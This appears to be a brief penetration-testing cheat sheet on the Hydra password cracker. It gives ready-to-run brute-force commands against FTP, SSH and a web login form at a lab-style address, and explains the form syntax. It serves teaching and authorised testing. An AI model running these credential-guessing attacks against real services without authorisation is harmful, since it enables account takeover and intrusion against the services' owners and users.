---
description: A fast network logon cracker designed for bruteforcing.
---

# Hydra

### Introduction

Hydra is a brute-force online password cracking program which runs through a list to brute-force certain authentication services. Hydra can use lists of hundreds of millions of passwords to attempt to guess a password for a service.

### Using Hydra

The options to pass into Hydra depend on the protocol which you are attacking. For example, brute-forcing FTP with a username of "user" and a password list "passlist.txt" would look like:

`hydra -l user -P passlist.txt ftp://10.10.10.10`

An example for SSH also specifying -t (the number of threads to spawn) would be:

`hydra -l [username] -P [list.txt] 10.10.10.10 -t 4 ssh`

For attacking a post web form:

```
hydra -l [username] -P [list.txt] 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

Here the login page is denoted with "/" - if your page was login.php then you would have /login.php here instead. "username" is the form field where the username is entered, a specified username will replace ^USER^. "password" is the form field where the password is entered, a specified password will replace ^PASS^. "F=incorrect" is a string which appears in the server reply to a failed login.
